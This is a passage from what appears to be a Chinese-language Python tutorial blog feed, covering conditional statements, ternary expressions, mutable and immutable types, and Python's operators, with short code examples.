class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加输入功能(漂亮与否是主观功能，就不输入了)</span></span><br><span class="line">name = input(<span class="string">&#x27;请问你的名字是:&#x27;</span>)</span><br><span class="line">age = input(<span class="string">&#x27;请问你的年龄：&#x27;</span>)</span><br><span class="line">age = int(age)</span><br><span class="line"><span class="keyword">if</span> age &lt; <span class="number">18</span>:</span><br><span class="line">    print(<span class="string">&#x27;小妹妹你来凑什么热闹&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> beautiful != <span class="literal">True</span>:</span><br><span class="line">    print(<span class="string">&#x27;....不好意思，我朋友住院了&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> name != <span class="string">&#x27;AYM&#x27;</span>:</span><br><span class="line">    print(<span class="string">&quot;虽然你漂亮，但你不是她&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="语法4"><a href="#语法4" class="headerlink" title="语法4"></a>语法4</h2><h3 id="伪代码-3"><a href="#伪代码-3" class="headerlink" title="伪代码"></a>伪代码</h3><p>判断条件成立，成立则运行代码1、2，不成立则运行继续运行下方的elif进行判断，遇到判断成立的则执行，如果到最后都没有成立的条件，则输出else运行else里面的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if 条件:</span><br><span class="line">    代码1</span><br><span class="line">    代码2</span><br><span class="line">elif 条件:</span><br><span class="line">    代码3</span><br><span class="line">    代码4</span><br><span class="line">elif 条件:</span><br><span class="line">    代码5</span><br><span class="line">    代码6</span><br><span class="line">elif 条件:</span><br><span class="line">    代码7</span><br><span class="line">    代码8</span><br><span class="line">.....</span><br><span class="line">else:</span><br><span class="line">    代码9</span><br><span class="line">    代码10</span><br></pre></td></tr></table></figure><h3 id="演示代码-3"><a href="#演示代码-3" class="headerlink" title="演示代码"></a>演示代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 成绩查询系统</span></span><br><span class="line">score = input(<span class="string">&quot;你的成绩：&quot;</span>)</span><br><span class="line">score = int(score)</span><br><span class="line"><span class="keyword">if</span> score &gt;= <span class="number">90</span>:</span><br><span class="line">    print(<span class="string">&quot;成绩为优秀&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;= <span class="number">80</span>:</span><br><span class="line">    print(<span class="string">&quot;成绩为良好&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;= <span class="number">70</span>:</span><br><span class="line">    print(<span class="string">&quot;成绩为一般&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> score &gt;= <span class="number">60</span>:</span><br><span class="line">    print(<span class="string">&quot;成绩为合格&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;明天请家长到学校来&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="if的嵌套"><a href="#if的嵌套" class="headerlink" title="if的嵌套"></a>if的嵌套</h2><p>if语句可以嵌套使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 成绩查询系统</span></span><br><span class="line">score = input(<span class="string">&quot;你的成绩：&quot;</span>)</span><br><span class="line">score = int(score)</span><br><span class="line"><span class="keyword">if</span> score &gt;= <span class="number">60</span>:</span><br><span class="line">    <span class="keyword">if</span> score &gt;=<span class="number">70</span>:</span><br><span class="line">        <span class="keyword">if</span> score &gt;= <span class="number">80</span>:</span><br><span class="line">            <span class="keyword">if</span> score &gt;= <span class="number">90</span>:</span><br><span class="line">                print(<span class="string">&quot;成绩优秀&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&quot;成绩良好&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;成绩一般&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;成绩合格&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;明天请家长&quot;</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="三元表达式"><a href="#三元表达式" class="headerlink" title="三元表达式"></a>三元表达式</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">5</span></span><br><span class="line">y = <span class="number">6</span></span><br><span class="line"><span class="comment"># 打印 x,y 中最大的值</span></span><br><span class="line"><span class="keyword">if</span> x&gt;y:</span><br><span class="line">    print(x)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三元表达式</span></span><br><span class="line"><span class="comment"># 成立 if 条件 else 不成立</span></span><br><span class="line">res = x <span class="keyword">if</span> x &gt; y <span class="keyword">else</span> y</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>11.python可变不可变类型</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/11.python%E5%8F%AF%E5%8F%98%E4%B8%8D%E5%8F%AF%E5%8F%98%E7%B1%BB%E5%9E%8B/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/11.python%E5%8F%AF%E5%8F%98%E4%B8%8D%E5%8F%AF%E5%8F%98%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p>可变不可变类型，就是对之前的数据类型进行补充，就是关于前面学过整型、浮点型、字符串、列表、字典、布尔，对他们进行一个分类</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/v2-4240913539ce0352a89c4044c2a418e9_720w.jpg" alt="img"></p><p>与我们之前提到过堆区和栈区的概念相关</p><a id="more"></a><hr><h1 id="可变类型"><a href="#可变类型" class="headerlink" title="可变类型"></a>可变类型</h1><p>指的是：值改变的情况下，id不变，证明改的是原值，也就是说对于栈区而言，所指向的堆区地址是相同的，改变的只是内存地址中存储的值</p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列表类型(可变类型)</span></span><br><span class="line">l = [<span class="number">123</span>,<span class="number">234</span>,<span class="number">456</span>]</span><br><span class="line">print(id(l))  <span class="comment"># 57045288</span></span><br><span class="line">l = [<span class="number">1234</span>,<span class="number">2345</span>]</span><br><span class="line">print(id(l))  <span class="comment"># 57024392</span></span><br><span class="line"><span class="comment"># 如果整体修改列表的内容，列表的ID会发生改变</span></span><br><span class="line"><span class="comment"># 但是！如果只是修改单个值，整个列表ID不会改变，改变的只是列表内部对应的值的内存空间地址，所以列表是可变类型</span></span><br><span class="line">l[<span class="number">1</span>] = <span class="number">1234</span></span><br><span class="line">print(l) <span class="comment"># 值已被修改[1234, 1234]</span></span><br><span class="line">print(id(l)) <span class="comment"># id没有改变 51781512</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典类型</span></span><br><span class="line">dic = &#123;<span class="string">&#x27;k1&#x27;</span>: <span class="number">111</span>, <span class="string">&#x27;k2&#x27;</span>: <span class="number">222</span>&#125;</span><br><span class="line">print(dic)  <span class="comment"># &#123;&#x27;k1&#x27;: 111, &#x27;k2&#x27;: 222&#125;</span></span><br><span class="line">print(id(dic))  <span class="comment"># 27814200</span></span><br><span class="line">dic[<span class="string">&#x27;k1&#x27;</span>] = <span class="number">444</span></span><br><span class="line">print(dic)  <span class="comment"># &#123;&#x27;k1&#x27;: 444, &#x27;k2&#x27;: 222&#125;</span></span><br><span class="line">print(id(dic))  <span class="comment"># 27814200</span></span><br><span class="line"><span class="comment"># 可以清楚看到值改变，但是id没有改变，其原理和列表类型相同，字典内部对应的地址改变了，但字典本身值没有改变，所以字典是可变类型</span></span><br><span class="line"><span class="comment"># 字典补充：字典内部定义是逗号分隔为多个&#123;key:value&#125;</span></span><br><span class="line"><span class="comment"># 其中value可以是任意类型</span></span><br><span class="line">    <span class="comment"># key必须是不可变类型</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同样，我们把一个列表赋值给另外一个列表，那么赋值的也是列表的内存地址，所以如果一个列表的内存地址里面存放的值被修改了，另外一个列表的值也会被修改</p><hr><h1 id="不可变类型"><a href="#不可变类型" class="headerlink" title="不可变类型"></a>不可变类型</h1><p>指的是：值改变的情况下，id也会改变，证明改的不是原值，而是产生新的值，改变的是栈区所对应的堆区地址，也就是说在堆区重新划分了一个取域存放新的值，然后栈区对应的地址指向新的值</p><h2 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># int类型</span></span><br><span class="line">x = <span class="number">10</span></span><br><span class="line">print(id(x))  <span class="comment"># 2061563968</span></span><br><span class="line">x = <span class="number">11</span></span><br><span class="line">print(id(x))  <span class="comment"># 2061563984</span></span><br><span class="line"><span class="comment"># float类型</span></span><br><span class="line">x = <span class="number">10.1</span></span><br><span class="line">print(id(x))  <span class="comment"># 59798736</span></span><br><span class="line">x = <span class="number">11.1</span></span><br><span class="line">print(id(x))  <span class="comment"># 59798912</span></span><br><span class="line"><span class="comment"># 字符串类型</span></span><br><span class="line">x = <span class="string">&quot;abc&quot;</span></span><br><span class="line">print(id(x))  <span class="comment"># 22741120</span></span><br><span class="line">x = <span class="string">&quot;bcd&quot;</span></span><br><span class="line">print(id(x))  <span class="comment"># 60099904</span></span><br><span class="line"><span class="comment"># 小结：int、float、str都被设计成了不可分割的整体，不能被改变</span></span><br><span class="line"><span class="comment"># 由于布尔类型只有True和False，故没法进行改变</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.Python的基本运算符</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/10.python%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/10.python%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<p>其实每种编程语言支持的运算符都差不多，但是简便作为python的座右铭，还是做出了一定的优化的</p><a id="more"></a><hr><h1 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h1><p> python支持的算数运算符与数学上计算的符号使用是一致的</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">例子 (A=2 B=5)</th></tr></thead><tbody><tr><td align="left">+</td><td align="left">加法 - 相加运算符两侧的值</td><td align="left">A + B 等于 7</td></tr><tr><td align="left">-</td><td align="left">减法 - 左操作数减去右操作数</td><td align="left">A – B 等于 -3</td></tr><tr><td align="left">*</td><td align="left">乘法 - 相乘运算符两侧的值</td><td align="left">A * B等于10</td></tr><tr><td align="left">/</td><td align="left">除法 - 左操作数除以右操作数</td><td align="left">B / A等于2.5</td></tr><tr><td align="left">//</td><td align="left">取整除 - 左操作数除以右操作数，只保留整数部分</td><td align="left">B / A等于2</td></tr><tr><td align="left">％</td><td align="left">取余 - 左操作数除以右操作数的余数</td><td align="left">B%A等于1</td></tr><tr><td align="left">**</td><td align="left">幂，取一个数的n次方</td><td align="left">A**B等于2的5次方32</td></tr></tbody></table><hr><h1 id="比较运算符-关系运算符"><a href="#比较运算符-关系运算符" class="headerlink" title="比较运算符(关系运算符)"></a>比较运算符(关系运算符)</h1><p>Python支持的关系运算符,表格中的实例整数变量A的值为10，变量B的值为20，返回的是布尔值True或False</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left">==</td><td align="left">检查如果两个操作数的值是否相等，如果相等则条件为真。</td><td align="left">（A==B)为假。</td></tr><tr><td align="left">!=</td><td align="left">检查如果两个操作数的值是否相等，如果值不相等则条件为真。</td><td align="left">(A!=B)为真。</td></tr><tr><td align="left">&gt;</td><td align="left">检查左操作数的值是否大于右操作数的值，如果是那么条件为真。</td><td align="left">（A&gt;B)为假。</td></tr><tr><td align="left">&lt;</td><td align="left">检查左操作数的值是否小于右操作数的值，如果是那么条件为真。</td><td align="left">（A&lt;B)为真。</td></tr><tr><td align="left">&gt;=</td><td align="left">检查左操作数的值是否大于或等于右操作数的值，如果是那么条件为真。</td><td align="left">（A&gt;=B)为假。</td></tr><tr><td align="left">&lt;=</td><td align="left">检查左操作数的值是否小于或等于右操作数的值，如果是那么条件为真。</td><td align="left">（A&lt;=B)为真。</td></tr></tbody></table><hr><h1 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h1><p>python语法中除了有=号这种简单的赋值运算外，还支持增量赋值、链式赋值、交叉赋值、解压赋值，这些赋值运算符存在的意义都是为了让我们的代码看起来更加精简。</p><h2 id="增量赋值"><a href="#增量赋值" class="headerlink" title="增量赋值"></a>增量赋值</h2><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left">=</td><td align="left">简单的赋值运算符，将右操作数的值赋给左侧操作数</td><td align="left">C = A + B将把A + B得到的值赋给C</td></tr><tr><td align="left">+ =</td><td align="left">加和赋值运算符，它把左操作数和右操作数相加赋值给左操作数</td><td align="left">C + = A等价于C = C + A</td></tr><tr><td align="left">- =</td><td align="left">减和赋值运算符，它把左操作数和右操作数相减赋值给左操作数</td><td align="left">C - = A等价于C = C - A</td></tr><tr><td align="left">* =</td><td align="left">乘和赋值运算符，它把左操作数和右操作数相乘赋值给左操作数</td><td align="left">C * = A等价于C = C * A</td></tr><tr><td align="left">/ =</td><td align="left">除和赋值运算符，它把左操作数和右操作数相除赋值给左操作数</td><td align="left">C/= A,C与A同类型时等价于 C = C / A</td></tr><tr><td align="left">％=</td><td align="left">取余和赋值运算符,它把左操作数和右操作数取余后赋值给左操作数</td><td align="left">C％= A等价于C = C％A</td></tr><tr><td align="left">&lt;&lt;=</td><td align="left">左移位赋值运算符</td><td align="left">C &lt;&lt; = 2等价于C = C &lt;&lt; 2</td></tr><tr><td align="left">&gt;&gt;=</td><td align="left">右移位赋值运算符</td><td align="left">C &gt;&gt; = 2等价于C = C &gt;&gt; 2</td></tr><tr><td align="left">＆=</td><td align="left">按位与赋值运算符</td><td align="left">C＆= 2等价于C = C＆2</td></tr><tr><td align="left">^=</td><td align="left">按位异或赋值运算符</td><td align="left">C ^ = 2等价于C = C ^ 2</td></tr><tr><td align="left">| =</td><td align="left">按位或赋值运算符</td><td align="left">C | = 2等价于C = C | 2</td></tr></tbody></table><h2 id="链式赋值"><a href="#链式赋值" class="headerlink" title="链式赋值"></a>链式赋值</h2><p>同一个值同时赋值给多个变量名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">z=<span class="number">10</span></span><br><span class="line">y=z</span><br><span class="line">x=y</span><br><span class="line">print(x,y,z)</span><br><span class="line"><span class="comment"># 输出结果 10, 10, 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 链式赋值指的是可以用一行代码搞定这件事</span></span><br><span class="line">x=y=z=<span class="number">10</span></span><br><span class="line">x,y,z</span><br><span class="line"><span class="comment"># 输出结果 10, 10, 10</span></span><br></pre></td></tr></table></figure><h2 id="交叉赋值"><a href="#交叉赋值" class="headerlink" title="交叉赋值"></a>交叉赋值</h2><p>两个变量m与n，将m与n的值交换过来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其他语言常用做法</span></span><br><span class="line">m=<span class="number">10</span></span><br><span class="line">n=<span class="number">20</span></span><br><span class="line">temp=m</span><br><span class="line">m=n</span><br><span class="line">n=temp</span><br><span class="line">print(m,n)</span><br><span class="line"><span class="comment"># 输出结果 20 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python做法</span></span><br><span class="line">m=<span class="number">10</span></span><br><span class="line">n=<span class="number">20</span></span><br><span class="line">m,n=n,m</span><br><span class="line">print(m,n)</span><br><span class="line"><span class="comment"># 输出结果 20 10</span></span><br></pre></td></tr></table></figure><h2 id="解压赋值"><a href="#解压赋值" class="headerlink" title="解压赋值"></a>解压赋值</h2><p>把列表中的多个值取出来依次赋值给多个变量名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nums=[<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>,<span class="number">55</span>]</span><br><span class="line">a=nums[<span class="number">0</span>]</span><br><span class="line">b=nums[<span class="number">1</span>]</span><br><span class="line">c=nums[<span class="number">2</span>]</span><br><span class="line">d=nums[<span class="number">3</span>]</span><br><span class="line">e=nums[<span class="number">4</span>]</span><br><span class="line">print(a,b,c,d,e)</span><br><span class="line"><span class="comment"># 输出结果 11 22 33 44 55</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 所谓解压赋值，python中还可以这么做</span></span><br><span class="line">nums=[<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>,<span class="number">55</span>]</span><br><span class="line">a,b,c,d,e=nums</span><br><span class="line">print(a,b,c,d,e)</span><br><span class="line"><span class="comment"># 输出结果 11 22 33 44 55</span></span><br><span class="line"><span class="comment"># 注意，上述解压赋值，等号左边的变量名个数必须与右面包含值的个数相同,否则会报错，但如果我们只想取头尾的几个值，可以用*_匹配</span></span><br><span class="line"><span class="comment"># 字符串、字典、元组、集合类型都支持解压赋值</span></span><br><span class="line">nums=[<span class="number">55</span>,<span class="number">66</span>,<span class="number">77</span>,<span class="number">88</span>,<span class="number">99</span>]</span><br><span class="line">a,b,*_=nums</span><br><span class="line">print(a,b)</span><br><span class="line"><span class="comment"># 输出结果 55 66</span></span><br></pre></td></tr></table></figure><hr><h1 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h1><p> 逻辑运算符用于连接多个条件，进行关联判断，会返回布尔值True或False</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left">and</td><td align="left">称为逻辑与运算符。当且仅当两个操作数都为真，条件才为真。</td><td align="left">3&gt;1 and 4==4(结果True)</td></tr><tr><td align="left">or</td><td align="left">称为逻辑或运算符。如果任何两个操作数任何一个为真，条件为真。</td><td align="left">1&gt;2 or 3&gt;1(结果True)</td></tr><tr><td align="left">not</td><td align="left">称为逻辑非运算符。用来反转操作数的逻辑状态。如果条件为true，则逻辑非运算符将得到false</td><td align="left">not 3&gt;2(结果True)</td></tr></tbody></table><h2 id="连续多个and"><a href="#连续多个and" class="headerlink" title="连续多个and"></a>连续多个and</h2><p>and连接多个条件，会按照从左到右的顺序依次判断，一旦某一个条件为False，则无需再往右判断，可以立即判定最终结果就为False，只有在所有条件的结果都为True的情况下，最终结果才为True</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span> &gt; <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> != <span class="number">1</span> <span class="keyword">and</span> <span class="literal">True</span> <span class="keyword">and</span> <span class="number">3</span> &gt; <span class="number">2</span> <span class="comment"># 判断完第二个条件，就立即结束，得的最终结果为False</span></span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure><h2 id="连续多个or"><a href="#连续多个or" class="headerlink" title="连续多个or"></a>连续多个or</h2><p>or连接多个条件，会按照从左到右的顺序依次判断，一旦某一个条件为True，则无需再往右判断，可以立即判定最终结果就为True，只有在所有条件的结果都为False的情况下，最终结果才为False</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span> &gt; <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span> != <span class="number">1</span> <span class="keyword">or</span> <span class="literal">True</span> <span class="keyword">or</span> <span class="number">3</span> &gt; <span class="number">2</span> <span class="comment"># 判断完第一个条件，就立即结束，得的最终结果为True</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="优先级not-gt-and-gt-or"><a href="#优先级not-gt-and-gt-or" class="headerlink" title="优先级not&gt;and&gt;or"></a>优先级not&gt;and&gt;or</h2><p>三者的优先级关系：not&gt;and&gt;or，同一优先级默认从左往右计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>&gt;<span class="number">4</span> <span class="keyword">and</span> <span class="number">4</span>&gt;<span class="number">3</span> <span class="keyword">or</span> <span class="number">1</span>==<span class="number">3</span> <span class="keyword">and</span> <span class="string">&#x27;x&#x27;</span> == <span class="string">&#x27;x&#x27;</span> <span class="keyword">or</span> <span class="number">3</span> &gt;<span class="number">3</span><span class="comment"># 结果False</span></span><br></pre></td></tr></table></figure><p>可以使用括号区别优先级</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">原理为：</span></span><br><span class="line"><span class="string">(1) not的优先级最高，就是把紧跟其后的那个条件结果取反，所以not与紧跟其后的条件不可分割</span></span><br><span class="line"><span class="string">(2) 如果语句中全部是用and连接，或者全部用or连接，那么按照从左到右的顺序依次计算即可</span></span><br><span class="line"><span class="string">(3) 如果语句中既有and也有or，那么先用括号把and的左右两个条件给括起来，然后再进行运算</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">(<span class="number">3</span>&gt;<span class="number">4</span> <span class="keyword">and</span> <span class="number">4</span>&gt;<span class="number">3</span>) <span class="keyword">or</span> (<span class="number">1</span>==<span class="number">3</span> <span class="keyword">and</span> <span class="string">&#x27;x&#x27;</span> == <span class="string">&#x27;x&#x27;</span>) <span class="keyword">or</span> <span class="number">3</span> &gt;<span class="number">3</span><span class="comment"># 结果False</span></span><br></pre></td></tr></table></figure><p>短路运算：逻辑运算的结果一旦可以确定，那么就以当前处计算到的值作为最终结果返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">or</span> <span class="string">&#x27;abc&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;egon&#x27;</span> == <span class="string">&#x27;dsb&#x27;</span> <span class="keyword">and</span> <span class="number">333</span> <span class="keyword">or</span> <span class="number">10</span> &gt; <span class="number">4</span></span><br><span class="line">我们用括号来明确一下优先级</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="number">10</span> <span class="keyword">and</span> <span class="number">0</span>) <span class="keyword">or</span> (<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> <span class="number">0</span>) <span class="keyword">or</span> <span class="string">&#x27;abc&#x27;</span> <span class="keyword">or</span> (<span class="string">&#x27;egon&#x27;</span> == <span class="string">&#x27;dsb&#x27;</span> <span class="keyword">and</span> <span class="number">333</span>) <span class="keyword">or</span> <span class="number">10</span> &gt; <span class="number">4</span></span><br><span class="line">短路：       <span class="number">0</span>      <span class="string">&#x27;&#x27;</span>           <span class="string">&#x27;abc&#x27;</span>                    </span><br><span class="line">            假     假             真</span><br><span class="line"></span><br><span class="line">返回：                           <span class="string">&#x27;abc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#4、短路运算面试题：</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span> <span class="keyword">or</span> <span class="number">3</span> <span class="comment"># 结果 1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span> <span class="keyword">and</span> <span class="number">3</span> <span class="comment"># 结果 3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0</span> <span class="keyword">and</span> <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span> <span class="comment"># 结果 0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0</span> <span class="keyword">and</span> <span class="number">2</span> <span class="keyword">or</span> <span class="number">1</span> <span class="comment"># 结果 1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0</span> <span class="keyword">and</span> <span class="number">2</span> <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">or</span> <span class="number">4</span> <span class="comment"># 结果 1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0</span> <span class="keyword">or</span> <span class="literal">False</span> <span class="keyword">and</span> <span class="number">1</span> <span class="comment"># 结果 False </span></span><br></pre></td></tr></table></figure><hr><h1 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h1><table><thead><tr><th>运算符</th><th>描述</th><th>例子</th></tr></thead><tbody><tr><td>in</td><td>某一个对象包含于另外一个对象则返回True，字符串、列表、元组、字典、集合都支持成员运算</td><td>‘hello’ in ‘hello world!’ 返回True</td></tr><tr><td>not 